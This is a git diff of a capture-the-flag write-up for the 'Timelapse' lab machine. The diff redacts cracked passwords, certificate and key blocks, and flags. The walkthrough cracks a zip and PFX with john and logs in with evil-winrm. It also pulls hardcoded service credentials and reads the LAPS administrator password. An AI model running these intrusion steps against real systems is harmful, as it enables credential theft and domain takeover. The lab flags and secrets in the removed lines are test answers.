@@ -162,14 +162,14 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 16 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
+<REDACTED>    (winrm_backup.zip/legacyy_dev_auth.pfx)
 1g 0:00:00:00 DONE (2025-09-30 00:36) 6.666g/s 23156Kp/s 23156Kc/s 23156KC/s swifcat13..supergau
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
 
-The password was found: `supremelegacy`
+The password was found: `<REDACTED>`
 We used it to extract the file:
 ```bash
 unzip winrm_backup.zip
@@ -181,9 +181,9 @@ Archive:  winrm_backup.zip
 This gave us a file named `legacyy_dev_auth.pfx`, which is a **PKCS#12 certificate bundle**, often used to store private keys and certificates — potentially very useful for authenticating to Windows services like WinRM.
 ```bash  
 ls -l
-.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
-.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
-.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip
+.rw-r--r-- 5.0k kali 30 Sep 00:34  backup.hash
+.rwxr-xr-x 2.6k kali 25 Oct  2021  legacyy_dev_auth.pfx
+.rw-r--r-- 2.6k kali 30 Sep 00:33  winrm_backup.zip
 
 file legacyy_dev_auth.pfx
 legacyy_dev_auth.pfx: data
@@ -205,13 +205,13 @@ Cost 1 (iteration count) is 2000 for all loaded hashes
 Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
 Will run 16 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-thuglegacy       (legacyy_dev_auth.pfx)
+<REDACTED>       (legacyy_dev_auth.pfx)
 1g 0:00:00:29 DONE (2025-09-30 01:10) 0.03356g/s 108484p/s 108484c/s 108484C/s thumper199..thscndsp1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-The password was successfully cracked: `thuglegacy`
+The password was successfully cracked: `<REDACTED>`
 
 ### Authenticating with Evil-WinRM using Certificate & Private Key
 
@@ -227,14 +227,14 @@ We extracted the certificate and key with:
 openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.cert
 Enter Import Password:
 ls -l
-.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
-drwxr-xr-x    - n0name 30 Sep 00:45  env
-drwxr-xr-x    - n0name 30 Sep 01:03  johnjumbo
-.rw------- 1.2k n0name 30 Sep 01:16  legacy.cert
-.rw------- 3.2k n0name 30 Sep 01:12  legacyy_dev_auth.pem
-.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
-.rw-r--r-- 5.1k n0name 30 Sep 01:09  pfx.hash
-.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip
+.rw-r--r-- 5.0k kali 30 Sep 00:34  backup.hash
+drwxr-xr-x    - kali 30 Sep 00:45  env
+drwxr-xr-x    - kali 30 Sep 01:03  johnjumbo
+.rw------- 1.2k kali 30 Sep 01:16  legacy.cert
+.rw------- 3.2k kali 30 Sep 01:12  legacyy_dev_auth.pem
+.rwxr-xr-x 2.6k kali 25 Oct  2021  legacyy_dev_auth.pfx
+.rw-r--r-- 5.1k kali 30 Sep 01:09  pfx.hash
+.rw-r--r-- 2.6k kali 30 Sep 00:33  winrm_backup.zip
 ```
 
 ```bash
@@ -244,23 +244,7 @@ Bag Attributes
 subject=CN=Legacyy
 issuer=CN=Legacyy
 -----BEGIN CERTIFICATE-----
-MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
-MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
-MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
-AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
-0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
-YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
-7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
-MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
-yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
-MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
-DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
-rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
-m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
-3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
-fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
-hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
-nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
+<SNIP - certificate data redacted>
 -----END CERTIFICATE-----
 ```
 
@@ -270,15 +254,15 @@ Enter Import Password:
 Enter PEM pass phrase:
 Verifying - Enter PEM pass phrase:
 ls -l
-.rw-r--r-- 5.0k n0name 30 Sep 00:34  backup.hash
-drwxr-xr-x    - n0name 30 Sep 00:45  env
-drwxr-xr-x    - n0name 30 Sep 01:03  johnjumbo
-.rw------- 1.2k n0name 30 Sep 01:16  legacy.cert
-.rw------- 2.1k n0name 30 Sep 01:17  legacy.key
-.rw------- 3.2k n0name 30 Sep 01:12  legacyy_dev_auth.pem
-.rwxr-xr-x 2.6k n0name 25 Oct  2021  legacyy_dev_auth.pfx
-.rw-r--r-- 5.1k n0name 30 Sep 01:09  pfx.hash
-.rw-r--r-- 2.6k n0name 30 Sep 00:33  winrm_backup.zip
+.rw-r--r-- 5.0k kali 30 Sep 00:34  backup.hash
+drwxr-xr-x    - kali 30 Sep 00:45  env
+drwxr-xr-x    - kali 30 Sep 01:03  johnjumbo
+.rw------- 1.2k kali 30 Sep 01:16  legacy.cert
+.rw------- 2.1k kali 30 Sep 01:17  legacy.key
+.rw------- 3.2k kali 30 Sep 01:12  legacyy_dev_auth.pem
+.rwxr-xr-x 2.6k kali 25 Oct  2021  legacyy_dev_auth.pfx
+.rw-r--r-- 5.1k kali 30 Sep 01:09  pfx.hash
+.rw-r--r-- 2.6k kali 30 Sep 00:33  winrm_backup.zip
 ```
 
 ```bash
@@ -291,39 +275,12 @@ Bag Attributes
 Key Attributes
     X509v3 Key Usage: 90
 -----BEGIN ENCRYPTED PRIVATE KEY-----
-MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQV89IqR4OLwFpw4pN
-72FvqgICCAAwDAYIKoZIhvcNAgkFADAdBglghkgBZQMEASoEEGoU0+Z5Onkn59l3
-AY3N88wEggTQ6X3YSp3nTDobnW68IheObhCbphTk78AaQa2X1i/PpMHT2UzzYAku
-IYkJtvABFTeZLKayn9rrO2p1/pXkyKC5E7gVvQetPGRnUs9ZfyJzZgtGAg/rJ5od
-DNZyO2DTReAOE5caFl7Q/7ZmvOReXi6CLzXN9Ze3l2GiqdtTjezKPQ7Cu3LKQRBr
-Sb03xAeBUfc+HEzVw3vksvw8YXytnQlZfEyGf3mjtk88OWAJQ0faWoUamWGs+efh
-moTcJqqz9/wktPZGhBgI5wp8IHYlT4mpXNZoSBU0q2cR08lAo5stbKAueBdLbz4I
-B444iC8bRvOBiCE2alT8hDs7/XEQPo9fO7QaOCz9R2FfGPJiju2BUWjsqI8E4sz1
-LcBSYxWSk1WBqHFny5u9FJvKSJqLvw/OLnb9LB2zIXXw24bBCpf29GdFKkiN5eMw
-10ljGxJxOKPJaHQ0p862kmap1B/YGkbecfy5Ox8rJa9ZUG60o0y7F2xHGP8VNtnN
-/THuy6ky25qASABdcUZ8PO9KXgUfajbPegNXErOz8ky78sdlqvr9CYnQFZNcKUBn
-XUMgsCgtj/zzx9g59gIJREfMZvtm8+DsQcjOj/H4tWqlNZr4y1lYQ6UYE3e7r3EV
-TGmBgvoRiow7PAv7G4FNiS+B5bHmdQR2yiBJJTrVk76r5tQws+YUiQj7/FxRfVK5
-q3HzY1MK6FrecBiozxveFRUn4/03fJPbkIH2QmlVKxYNJcsLHSogcwgThq3w4R52
-Scur4ZeABN8kVABuyjzlkSPaEM2yXNkliGA+NhoipIR9+Kux0DOK1F4E9Iu8BCDW
-03UdHhyZrxiaq68MKvnoLOyQnAl2PrwNgsqwC2aekH03xdS6qGLyk/zpRa6oOg5H
-qtWxgR2RlYsIxL9wnGiPzt7J6kdXQPFX8N2uUVTk8/ZT97xCh7Zth8QnHt5DheQN
-AT/+c1QaFyBkfgXvv5IJxNk0sjdSKBLmFZDROariE63aANa2YSEDsJskOw+m7ppW
-pQZM+9itIz97wQ9qMXeg8We5x2h7oZsdoQ9SXNOEJnGhrdC9dKRRGbnQOHR+uQbh
-KLPc8tsTG61J+5TpKnYiYJIy17weZvRDv+sEflckGjMRCeftYrrxGN1DhjSzUmkA
-nSkgCd+37I+qFDSMdW+papOLNl5sWEistMYHufcNf3Qa69fkrI5wYbIEJSXMVHls
-7jtlRv3nPz4smLV1KDcjHXDCUS6pIlIa6fy4rhqlU3LUXyLKToiZvjMCIwRViw6s
-WQC6iBWVN/2J9smqaQbt0+5YW53GyjzpI4hpY6yGYoCEWgtwYMlsKQpzSZwdT6PE
-2TdUZT4G0xwGhQpxabz7qyeI3LQU3g1+gx5YOYf4TSPOD0E2BRooIsZh4TzmqtF7
-i8dMj2ouTX39l5d1NP2FNSeHt/DzYVuP1tlS1Pf/zZ52eCKnl+TBGAwk1N5YOHfQ
-Vvn8/0aSBmydLwNXAj3YFW2Ui7fE1f5VpNePTgncuDShvcMO4J0XK7gVTz3xU977
-Fh36kuUJftxxNOl4lv07Yv8oO8GQIKEOHedqqb2mdcb2SSkpN5H2GnynfbiiyfI1
-ZQb/msURZBTM0ir1tF5pBoQL3xgOnLk0Oblx/0c5lLC0FqRi25w1fXM=
+<SNIP - private key redacted>
 -----END ENCRYPTED PRIVATE KEY-----
 ```
 
 The `.key` file was encrypted, so we cracked its passphrase using `pfx2john` + `john`:
-Password: `thuglegacy`
+Password: `<REDACTED>`
 
 Once we had both components (`legacy.cert` and decrypted `legacy.key`), we attempted WinRM login using `evil-winrm`
 ```bash
@@ -358,7 +315,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
-801aa6ed3f58b6cfc291c9592831c71b
+<USER_FLAG>
 ```
 ### Post-Exploitation
 After gaining access as `legacyy`, we proceeded with **post-exploitation enumeration** to identify potential privilege escalation paths. A common first step in this phase is to run **automated enumeration tools** like **winPEAS**.
@@ -369,7 +326,7 @@ We uploaded the binary via `evil-winrm`:
 ```powershell
 *Evil-WinRM* PS C:\Users\legacyy\Desktop> upload winPEASx64.exe
 
-Info: Uploading /home/n0name/Documents/HTBLabs/Machines/Easy/Timelapse/winPEASx64.exe to C:\Users\legacyy\Desktop\winPEASx64.exe
+Info: Uploading ~/winPEASx64.exe to C:\Users\legacyy\Desktop\winPEASx64.exe
 Enter PEM pass phrase:
 
 Data: 13555028 bytes of 13555028 bytes copied
@@ -457,7 +414,7 @@ whoami
 ipconfig /all
 netstat -ano |select-string LIST
 $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
-$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$p = ConvertTo-SecureString '<REDACTED>' -AsPlainText -Force
 $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
 invoke-command -computername localhost -credential $c -port 5986 -usessl -
 SessionOption $so -scriptblock {whoami}
@@ -465,14 +422,14 @@ get-aduser -filter * -properties *
 exit
 ```
 
-Inside, we found a hardcoded password used to create a `PSCredential` object for user `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
+Inside, we found a hardcoded password used to create a `PSCredential` object for user `svc_deploy:<REDACTED>`
 
 To connect using `evil-winrm`, we used:
-`evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'`
+`evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p '<REDACTED>'`
 The `-S` flag forces the use of **SSL (HTTPS)** on port **5986**, which is required when WinRM is configured for **secure communication** only.  
 Without `-S`, `evil-winrm` attempts a connection over HTTP (port 5985), which would fail if the server requires SSL.
 ```powershell
-evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
+evil-winrm -S -i 10.10.11.152 -u 'svc_deploy' -p '<REDACTED>'
 
 Evil-WinRM shell v3.7
 
@@ -555,7 +512,7 @@ We used the following PowerShell command to extract all computers and their LAPS
 DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
 DNSHostName                 : dc01.timelapse.htb
 Enabled                     : True
-ms-mcs-admpwd               : vmct)Q3Mo6y5/65iJY{1;ZoO
+ms-mcs-admpwd               : <REDACTED>
 ms-mcs-admpwdexpirationtime : 134041364447201437
 Name                        : DC01
 ObjectClass                 : computer
@@ -596,12 +553,12 @@ UserPrincipalName :
 ```
 
 This revealed the password for the domain controller `DC01`:
-`Administrator:vmct)Q3Mo6y5/65iJY{1;ZoO`
+`Administrator:<REDACTED>`
 This is the local Administrator password for the DC.
 
 Using the credentials, we authenticated as Administrator:
 ```powershell
-evil-winrm -S -i 10.10.11.152 -u 'Administrator' -p 'vmct)Q3Mo6y5/65iJY{1;ZoO'
+evil-winrm -S -i 10.10.11.152 -u 'Administrator' -p '<REDACTED>'
 
 Evil-WinRM shell v3.7
 
@@ -630,6 +587,6 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
-3228e81d48155cdec1ec3623370c58f2
+<ROOT_FLAG>
 ```
 Rooted!
